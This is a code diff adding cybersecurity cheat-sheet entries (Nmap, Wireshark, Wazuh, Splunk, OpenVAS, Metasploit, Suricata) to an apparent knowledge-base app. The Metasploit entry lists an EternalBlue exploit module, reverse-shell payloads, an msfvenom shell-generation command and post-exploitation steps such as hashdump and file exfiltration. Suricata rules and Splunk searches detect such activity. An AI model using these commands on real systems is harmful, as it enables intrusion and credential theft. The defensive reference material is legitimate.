@@ -566,6 +566,176 @@ drop tcp $HOME_NET any -> any 4444 \
 <div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Logs &amp; Operations</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>/var/log/suricata/fast.log</code></td><td>Human-readable alert log</td></tr><tr><td><code>/var/log/suricata/eve.json</code></td><td>JSON log (ingest into SIEM)</td></tr><tr><td><code>/var/log/suricata/stats.log</code></td><td>Performance counters</td></tr><tr><td><code>suricata-update list-sources</code></td><td>Show available rule feeds</td></tr><tr><td><code>suricata-update enable-source et/open</code></td><td>Enable Emerging Threats</td></tr><tr><td><code>suricata-update update</code></td><td>Pull latest rules</td></tr><tr><td><code>systemctl reload suricata</code></td><td>Reload rules without restart</td></tr><tr><td><code>suricatasc -c "iface-stat eth0"</code></td><td>Live interface stats</td></tr></tbody></table></div></div></div>
 </div>`
     },
+    {
+      id: 1700000008000,
+      title: 'Nmap — Network Scanning',
+      category: 'Cybersecurity / Tools', visibility: 'public', author: 'JRojas',
+      created: 1700000008000,
+      tags: ['nmap', 'scanning', 'network', 'pentest', 'recon', 'cheat-sheet'],
+      summary: 'Nmap host discovery, port scanning, service and OS detection, NSE scripts, and output formats.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Host Discovery</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>nmap -sn 192.168.1.0/24</code></td><td>Ping scan, no port scan</td></tr><tr><td><code>nmap -sn -PR 192.168.1.0/24</code></td><td>ARP ping (LAN only)</td></tr><tr><td><code>nmap -sL 192.168.1.0/24</code></td><td>List targets without scanning</td></tr><tr><td><code>nmap -Pn 10.0.0.5</code></td><td>Skip discovery, assume host is up</td></tr><tr><td><code>nmap -iL hosts.txt</code></td><td>Read targets from file</td></tr><tr><td><code>nmap --exclude 192.168.1.1</code></td><td>Exclude a specific host</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Port Scanning</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>nmap -sS 10.0.0.5</code></td><td>SYN scan (stealth, requires root)</td></tr><tr><td><code>nmap -sT 10.0.0.5</code></td><td>TCP connect scan (no root needed)</td></tr><tr><td><code>nmap -sU -p 53,161 10.0.0.5</code></td><td>UDP scan on specific ports</td></tr><tr><td><code>nmap -p- 10.0.0.5</code></td><td>Scan all 65535 ports</td></tr><tr><td><code>nmap -p 22,80,443 10.0.0.5</code></td><td>Scan specific ports</td></tr><tr><td><code>nmap -F 10.0.0.5</code></td><td>Fast scan (top 100 ports)</td></tr><tr><td><code>nmap --top-ports 1000 10.0.0.5</code></td><td>Top 1000 most common ports</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Service &amp; OS Detection</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>nmap -sV 10.0.0.5</code></td><td>Service version detection</td></tr><tr><td><code>nmap -sV --version-intensity 9</code></td><td>Aggressive version probing</td></tr><tr><td><code>nmap -O 10.0.0.5</code></td><td>OS detection (requires root)</td></tr><tr><td><code>nmap -A 10.0.0.5</code></td><td>Aggressive: -sV -O -sC --traceroute</td></tr><tr><td><code>nmap -sC 10.0.0.5</code></td><td>Run default NSE scripts</td></tr><tr><td><code>nmap -T4 -A 10.0.0.0/24</code></td><td>Fast aggressive subnet scan</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">NSE Scripts &amp; Output</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>nmap --script vuln 10.0.0.5</code></td><td>Run all vuln-category scripts</td></tr><tr><td><code>nmap --script smb-vuln-* 10.0.0.5</code></td><td>SMB vulnerability checks</td></tr><tr><td><code>nmap --script http-enum 10.0.0.5</code></td><td>Enumerate web directories</td></tr><tr><td><code>nmap --script ssl-enum-ciphers -p 443</code></td><td>List TLS ciphers</td></tr><tr><td><code>nmap -oN scan.txt</code></td><td>Save normal output</td></tr><tr><td><code>nmap -oX scan.xml</code></td><td>Save XML output</td></tr><tr><td><code>nmap -oA scan</code></td><td>Save all formats at once</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000009000,
+      title: 'Wireshark & tcpdump',
+      category: 'Cybersecurity / Tools', visibility: 'public', author: 'JRojas',
+      created: 1700000009000,
+      tags: ['wireshark', 'tcpdump', 'packet-capture', 'network', 'cheat-sheet'],
+      summary: 'tcpdump capture syntax, Wireshark display filters, and common traffic analysis patterns.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">tcpdump Capture</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>tcpdump -i eth0</code></td><td>Capture on interface eth0</td></tr><tr><td><code>tcpdump -i any -n</code></td><td>All interfaces, no DNS lookup</td></tr><tr><td><code>tcpdump host 10.0.0.5</code></td><td>Filter by host</td></tr><tr><td><code>tcpdump port 443</code></td><td>Filter by port</td></tr><tr><td><code>tcpdump src 10.0.0.1 and dst port 80</code></td><td>Source + destination port filter</td></tr><tr><td><code>tcpdump -w capture.pcap</code></td><td>Write to PCAP file</td></tr><tr><td><code>tcpdump -r capture.pcap</code></td><td>Read from PCAP file</td></tr><tr><td><code>tcpdump -c 100 -i eth0</code></td><td>Capture exactly 100 packets</td></tr><tr><td><code>tcpdump -X port 80</code></td><td>Show hex + ASCII payload</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Wireshark Display Filters</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>ip.addr == 10.0.0.5</code></td><td>Any traffic to/from host</td></tr><tr><td><code>ip.src == 10.0.0.1</code></td><td>Traffic from source only</td></tr><tr><td><code>tcp.port == 443</code></td><td>TCP on port 443</td></tr><tr><td><code>http.request.method == "POST"</code></td><td>HTTP POST requests</td></tr><tr><td><code>dns.qry.name contains "evil"</code></td><td>DNS queries containing string</td></tr><tr><td><code>tcp.flags.syn == 1 && tcp.flags.ack == 0</code></td><td>SYN packets (new connections)</td></tr><tr><td><code>frame.len > 1400</code></td><td>Large frames (possible data exfil)</td></tr><tr><td><code>!(arp or dns or icmp)</code></td><td>Exclude noise protocols</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Protocol Filters</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>tls.handshake.type == 1</code></td><td>TLS Client Hello</td></tr><tr><td><code>http.response.code == 200</code></td><td>Successful HTTP responses</td></tr><tr><td><code>smb2.cmd == 5</code></td><td>SMB2 Create requests</td></tr><tr><td><code>icmp.type == 8</code></td><td>ICMP Echo Requests (ping)</td></tr><tr><td><code>ftp.request.command == "PASS"</code></td><td>FTP password attempts</td></tr><tr><td><code>ssh.message_code == 50</code></td><td>SSH auth attempts</td></tr><tr><td><code>kerberos.CNameString</code></td><td>Kerberos principal names</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Analysis Tips</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><strong>Follow Stream</strong></td><td>Right-click → Follow → TCP Stream to read full session</td></tr><tr><td><strong>Statistics → Conversations</strong></td><td>See top talkers by volume</td></tr><tr><td><strong>Statistics → Protocol Hierarchy</strong></td><td>Break down traffic by protocol</td></tr><tr><td><strong>Export Objects</strong></td><td>File → Export Objects → HTTP to extract files</td></tr><tr><td><strong>Coloring Rules</strong></td><td>View → Coloring Rules to highlight suspicious traffic</td></tr><tr><td><strong>tshark</strong></td><td><code>tshark -r file.pcap -T fields -e ip.src -e http.host</code> for CLI extraction</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000010000,
+      title: 'Wazuh — SIEM / XDR Deployment',
+      category: 'Cybersecurity / SIEM', visibility: 'public', author: 'JRojas',
+      created: 1700000010000,
+      tags: ['wazuh', 'siem', 'xdr', 'edr', 'log-management', 'cheat-sheet'],
+      summary: 'Wazuh agent installation on Linux and Windows, custom rule writing, and alert tuning.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Agent Install — Linux</h6><pre class="small mb-0"><code>curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH \
+  | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
+echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] \
+  https://packages.wazuh.com/4.x/apt/ stable main" \
+  > /etc/apt/sources.list.d/wazuh.list
+apt update
+WAZUH_MANAGER="10.0.0.1" apt install -y wazuh-agent
+systemctl enable --now wazuh-agent</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Agent Install — Windows (PowerShell)</h6><pre class="small mb-0"><code>Invoke-WebRequest -Uri `
+  https://packages.wazuh.com/4.x/windows/wazuh-agent-4.x.x.msi `
+  -OutFile wazuh-agent.msi
+msiexec /i wazuh-agent.msi /q `
+  WAZUH_MANAGER="10.0.0.1" `
+  WAZUH_AGENT_NAME="WIN-HOST"
+Start-Service WazuhSvc
+Set-Service WazuhSvc -StartupType Automatic</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Custom Rules</h6><p class="small mb-1">Add to <code>/var/ossec/etc/rules/local_rules.xml</code>:</p><pre class="small mb-0"><code>&lt;group name="local,syslog,"&gt;
+  &lt;rule id="100001" level="10"&gt;
+    &lt;if_group&gt;authentication_failed&lt;/if_group&gt;
+    &lt;match&gt;Failed password&lt;/match&gt;
+    &lt;description&gt;SSH brute force attempt&lt;/description&gt;
+    &lt;group&gt;authentication_failures,&lt;/group&gt;
+  &lt;/rule&gt;
+&lt;/group&gt;</code></pre><p class="small mt-2 mb-0">Test: <code>wazuh-logtest</code> — then <code>systemctl restart wazuh-manager</code></p></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Useful Commands</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>/var/ossec/bin/agent_control -l</code></td><td>List all agents</td></tr><tr><td><code>/var/ossec/bin/agent_control -i 001</code></td><td>Agent info by ID</td></tr><tr><td><code>wazuh-logtest</code></td><td>Test log against rules interactively</td></tr><tr><td><code>tail -f /var/ossec/logs/alerts/alerts.log</code></td><td>Live alert feed</td></tr><tr><td><code>/var/ossec/bin/wazuh-control status</code></td><td>Service component status</td></tr><tr><td><code>ossec-analysisd -t</code></td><td>Test rule config syntax</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000011000,
+      title: 'Splunk — SPL & Search',
+      category: 'Cybersecurity / SIEM', visibility: 'public', author: 'JRojas',
+      created: 1700000011000,
+      tags: ['splunk', 'spl', 'siem', 'log-analysis', 'cheat-sheet'],
+      summary: 'Splunk SPL search fundamentals, common commands, index/sourcetype setup, and alert creation.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">SPL Basics</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>index=main</code></td><td>Search all events in "main" index</td></tr><tr><td><code>index=* sourcetype=syslog</code></td><td>Filter by sourcetype</td></tr><tr><td><code>earliest=-24h latest=now</code></td><td>Time range modifier</td></tr><tr><td><code>host=webserver01</code></td><td>Filter by host field</td></tr><tr><td><code>source="/var/log/auth.log"</code></td><td>Filter by source file</td></tr><tr><td><code>NOT (error OR fail*)</code></td><td>Exclude terms with boolean</td></tr><tr><td><code>"failed password" OR "invalid user"</code></td><td>OR search with phrases</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Common Commands</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>| stats count by src_ip</code></td><td>Count events grouped by field</td></tr><tr><td><code>| stats dc(user) by src_ip</code></td><td>Distinct count of users per IP</td></tr><tr><td><code>| table _time, src_ip, user, action</code></td><td>Display specific fields as table</td></tr><tr><td><code>| sort -count</code></td><td>Sort descending by count</td></tr><tr><td><code>| head 20</code></td><td>Return top 20 results</td></tr><tr><td><code>| eval risk=if(count&gt;10,"high","low")</code></td><td>Add calculated field</td></tr><tr><td><code>| rex "user=(?&lt;username&gt;\w+)"</code></td><td>Extract field with regex</td></tr><tr><td><code>| timechart span=1h count by action</code></td><td>Events over time chart</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Threat Hunting Searches</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>index=* "failed password" | stats count by src_ip | where count &gt; 20</code></td><td>SSH brute force detection</td></tr><tr><td><code>index=* sourcetype=WinEventLog EventCode=4625 | stats count by Account_Name</code></td><td>Windows login failures</td></tr><tr><td><code>index=* sourcetype=WinEventLog EventCode=4688 | table _time, host, New_Process_Name, Creator_Process_Name</code></td><td>New process creation</td></tr><tr><td><code>index=* bytes_out &gt; 1000000 | stats sum(bytes_out) by dest_ip | sort -sum(bytes_out)</code></td><td>Data exfiltration candidates</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Alerts &amp; Lookups</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><strong>Scheduled Alert</strong></td><td>Save Search → Alert → set cron + threshold + action (email/webhook)</td></tr><tr><td><strong>Real-time Alert</strong></td><td>Save Search → Alert → Real-time → trigger per-result</td></tr><tr><td><code>| lookup threat_intel.csv ip AS src_ip OUTPUT threat_level</code></td><td>Enrich with CSV lookup</td></tr><tr><td><code>| inputlookup threat_intel.csv</code></td><td>View lookup table contents</td></tr><tr><td><code>| outputlookup results.csv</code></td><td>Write results to lookup CSV</td></tr><tr><td><strong>props.conf</strong></td><td>Define sourcetype parsing, field extractions, timestamp format</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000012000,
+      title: 'OpenVAS / Greenbone — Vulnerability Scanning',
+      category: 'Cybersecurity / Tools', visibility: 'public', author: 'JRojas',
+      created: 1700000012000,
+      tags: ['openvas', 'greenbone', 'vulnerability', 'scanning', 'gvm', 'cheat-sheet'],
+      summary: 'OpenVAS/Greenbone Community Edition setup, scan configuration, CLI usage, and report interpretation.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Install &amp; Setup (Ubuntu)</h6><pre class="small mb-0"><code>apt install -y gvm
+gvm-setup          # ~20 min, sets up feeds
+gvm-check-setup    # verify everything is ready
+gvm-start          # start all GVM services
+# Web UI at https://localhost:9392
+# Credentials shown by gvm-setup</code></pre><p class="small mt-2 mb-0">Update NVT feeds: <code>greenbone-nvt-sync</code><br>Update SCAP data: <code>greenbone-scapdata-sync</code></p></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Scan Setup (Web UI)</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><strong>1. Create Target</strong></td><td>Configuration → Targets → New — enter IP/range, set port list</td></tr><tr><td><strong>2. Choose Scanner</strong></td><td>OpenVAS Default Scanner for full NVT scan</td></tr><tr><td><strong>3. Select Scan Config</strong></td><td>Full and Fast (recommended) or Full and Deep</td></tr><tr><td><strong>4. Create Task</strong></td><td>Scans → Tasks → New Task — link target + config</td></tr><tr><td><strong>5. Run &amp; Monitor</strong></td><td>Click play button; progress shown in Tasks view</td></tr><tr><td><strong>6. View Report</strong></td><td>Scans → Reports → click result for findings</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">gvm-cli Commands</h6><pre class="small mb-0"><code># List targets
+gvm-cli socket --gmp-username admin \
+  --gmp-password pass \
+  --xml "&lt;get_targets/&gt;"
+
+# List tasks
+gvm-cli socket ... --xml "&lt;get_tasks/&gt;"
+
+# Start a task
+gvm-cli socket ... \
+  --xml "&lt;start_task task_id='UUID'/&gt;"
+
+# Get report
+gvm-cli socket ... \
+  --xml "&lt;get_reports report_id='UUID' \
+  format_id='c402cc3e-b531'/&gt;"</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Report Interpretation</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><strong>Critical (9.0–10.0)</strong></td><td>Patch immediately — RCE, auth bypass, active exploits</td></tr><tr><td><strong>High (7.0–8.9)</strong></td><td>Patch this sprint — privilege escalation, data exposure</td></tr><tr><td><strong>Medium (4.0–6.9)</strong></td><td>Schedule fix — misconfigs, weak ciphers, info disclosure</td></tr><tr><td><strong>Low (0.1–3.9)</strong></td><td>Track in backlog — best-practice gaps</td></tr><tr><td><strong>False Positive</strong></td><td>Override finding with justification to suppress re-reporting</td></tr><tr><td><strong>QoD</strong></td><td>Quality of Detection — filter by &gt;70% to reduce noise</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000013000,
+      title: 'Metasploit Framework',
+      category: 'Cybersecurity / Pentest', visibility: 'public', author: 'JRojas',
+      created: 1700000013000,
+      tags: ['metasploit', 'msf', 'pentest', 'exploit', 'ctf', 'cheat-sheet'],
+      summary: 'Metasploit msfconsole workflow, module types, common payloads, and post-exploitation — for authorized pentests and CTF.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">msfconsole Basics</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>msfconsole</code></td><td>Launch the framework</td></tr><tr><td><code>msfdb init</code></td><td>Initialize PostgreSQL database</td></tr><tr><td><code>db_status</code></td><td>Check DB connection in console</td></tr><tr><td><code>help</code></td><td>Show all commands</td></tr><tr><td><code>version</code></td><td>Show MSF version</td></tr><tr><td><code>exit</code></td><td>Quit msfconsole</td></tr><tr><td><code>workspace -a pentest1</code></td><td>Create named workspace</td></tr><tr><td><code>db_import scan.xml</code></td><td>Import Nmap XML results</td></tr><tr><td><code>hosts / services / vulns</code></td><td>Query database tables</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Module Workflow</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>search type:exploit platform:windows smb</code></td><td>Search modules by criteria</td></tr><tr><td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td><td>Select a module</td></tr><tr><td><code>info</code></td><td>Show module description &amp; options</td></tr><tr><td><code>show options</code></td><td>List required/optional settings</td></tr><tr><td><code>set RHOSTS 10.0.0.5</code></td><td>Set target host</td></tr><tr><td><code>set LHOST 10.0.0.1</code></td><td>Set local (attacker) IP</td></tr><tr><td><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></td><td>Set payload</td></tr><tr><td><code>check</code></td><td>Check if target is vulnerable</td></tr><tr><td><code>run</code> / <code>exploit</code></td><td>Execute the module</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Common Payloads</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>windows/x64/meterpreter/reverse_tcp</code></td><td>Staged Windows Meterpreter</td></tr><tr><td><code>windows/x64/meterpreter_reverse_tcp</code></td><td>Stageless Windows Meterpreter</td></tr><tr><td><code>linux/x64/meterpreter/reverse_tcp</code></td><td>Linux Meterpreter</td></tr><tr><td><code>cmd/unix/reverse_bash</code></td><td>Simple bash reverse shell</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe</code></td><td>Generate standalone payload</td></tr></tbody></table></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Post-Exploitation (Meterpreter)</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>sessions -l</code></td><td>List active sessions</td></tr><tr><td><code>sessions -i 1</code></td><td>Interact with session 1</td></tr><tr><td><code>getuid</code></td><td>Current user</td></tr><tr><td><code>getsystem</code></td><td>Attempt privilege escalation</td></tr><tr><td><code>hashdump</code></td><td>Dump local password hashes</td></tr><tr><td><code>sysinfo</code></td><td>Target OS &amp; hostname</td></tr><tr><td><code>run post/multi/recon/local_exploit_suggester</code></td><td>Find local privesc paths</td></tr><tr><td><code>run post/windows/gather/enum_logged_on_users</code></td><td>List logged-in users</td></tr><tr><td><code>download file.txt /local/path</code></td><td>Exfiltrate a file</td></tr></tbody></table></div></div></div>
+</div>`
+    },
+    {
+      id: 1700000014000,
+      title: 'Suricata — IDS / IPS',
+      category: 'Cybersecurity / IDS-IPS', visibility: 'public', author: 'JRojas',
+      created: 1700000014000,
+      tags: ['suricata', 'ids', 'ips', 'nids', 'rules', 'eve', 'cheat-sheet'],
+      summary: 'Suricata installation, IDS vs IPS deployment modes, rule syntax, eve.json log parsing, and rule management.',
+      body: `<div class="row g-3">
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Install &amp; Modes</h6><pre class="small mb-0"><code># Install (Ubuntu)
+apt install -y suricata
+suricata-update         # pull latest rules
+
+# IDS mode (passive, reads traffic)
+suricata -c /etc/suricata/suricata.yaml \
+  -i eth0
+
+# IDS from PCAP (offline)
+suricata -c /etc/suricata/suricata.yaml \
+  -r capture.pcap
+
+# IPS mode (inline, requires NFQ)
+suricata -c /etc/suricata/suricata.yaml \
+  --af-packet eth0
+# Add iptables rule to feed traffic to NFQ</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Rule Syntax</h6><pre class="small mb-0"><code># Format:
+# action proto src_ip src_port -> dst_ip dst_port (options)
+
+alert tcp any any -> $HOME_NET 22 (
+  msg:"SSH brute force attempt";
+  flow:to_server,established;
+  detection_filter:track by_src,
+    count 5, seconds 60;
+  classtype:attempted-admin;
+  sid:9000001; rev:1;
+)
+
+drop http any any -> any any (
+  msg:"Blocked User-Agent";
+  http.user_agent; content:"sqlmap";
+  sid:9000002; rev:1;
+)</code></pre></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">eve.json Log Fields</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>event_type</code></td><td>alert, dns, http, tls, flow, fileinfo</td></tr><tr><td><code>alert.signature</code></td><td>Rule message that triggered</td></tr><tr><td><code>alert.severity</code></td><td>1=high, 2=medium, 3=low</td></tr><tr><td><code>src_ip / dest_ip</code></td><td>Source and destination addresses</td></tr><tr><td><code>http.hostname</code></td><td>HTTP Host header value</td></tr><tr><td><code>dns.rrname</code></td><td>DNS query name</td></tr><tr><td><code>tls.sni</code></td><td>TLS Server Name Indication</td></tr><tr><td><code>fileinfo.filename</code></td><td>Extracted file name</td></tr></tbody></table><p class="small mt-2 mb-0">Parse live: <code>tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'</code></p></div></div></div>
+<div class="col-12 col-lg-6"><div class="card h-100 border-0 bg-body-secondary"><div class="card-body"><h6 class="card-title text-primary mb-2">Rule Management</h6><table class="table table-sm table-borderless mb-0 small"><tbody><tr><td><code>suricata-update</code></td><td>Update all enabled rule sources</td></tr><tr><td><code>suricata-update list-sources</code></td><td>Show available rule feeds</td></tr><tr><td><code>suricata-update enable-source et/open</code></td><td>Enable Emerging Threats Open</td></tr><tr><td><code>suricata -T -c /etc/suricata/suricata.yaml</code></td><td>Test config syntax</td></tr><tr><td><code>suricatasc -c "reload-rules"</code></td><td>Hot-reload rules without restart</td></tr><tr><td><code>/etc/suricata/rules/local.rules</code></td><td>Add custom rules here</td></tr><tr><td><code>threshold.conf</code></td><td>Suppress noisy rules without disabling</td></tr></tbody></table></div></div></div>
+</div>`
+    },
   ];
 
   const VISIBILITY_LEVELS = { public: 0, reader: 1, admin: 3 };
